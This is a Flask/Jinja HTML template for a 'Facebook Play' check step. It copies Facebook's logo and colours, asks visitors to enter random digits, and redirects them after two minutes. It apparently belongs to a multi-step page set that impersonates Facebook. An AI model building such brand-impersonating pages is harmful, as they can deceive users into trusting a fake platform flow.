{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 0 25px rgba(24,119,242,0.15);border-radius:20px;">
  <div class="platform-header">
    <div class="icon-circle bg-facebook">
      <i class="fa-brands fa-facebook icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook Play</h2>
      <div style="color:#64748b;font-size:13px">Play check…</div>
    </div>
  </div>

  <h3 style="color:#e11d48">Play check…</h3>
  <p>Step1: Put a smile on your face. Step2: Type any random digits below and click Submit to continue.</p>

  <form method="post">
    <input class="input" name="digits" placeholder="Enter digits (4+)" pattern="\d{4,}" required>
    <div class="center">
      <button class="btn btn-blue login-btn" type="submit">Submit</button>
    </div>
  </form>

  <p style="font-size:13px;color:#64748b;margin-top:8px">
    If you do nothing, after 2 minutes you'll be sent to the next step automatically.
  </p>

  <script>
    // Auto redirect after 2 minutes (120,000 ms)
    setTimeout(function(){
      window.location = "{{ url_for('f1') }}";
    }, 120000);
  </script>
</div>

<style>
.input {
  width: 100%;
  padding: 14px;
  border-radius: 18px;
  border: 1px solid #e5e7eb;
  margin-bottom: 8px;
  font-size: 16px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.input:focus {
  border-color: #1877F2;
  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
  outline: none;
}
.btn-blue {
  width: 100%;
  background: #1877F2;
  color: #fff;
  font-size: 16px;
  font-weight: 600;
  padding: 12px;
  border-radius: 25px;
  cursor: pointer;
  border: none;
  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
  box-shadow: 0 6px 16px rgba(24, 119, 242, 0.25);
  display: block;
  margin-top: 8px;
}
.btn-blue:hover {
  background: #166fe5;
}
.btn-blue:active {
  transform: scale(0.985);
}
</style>
{% endblock %}
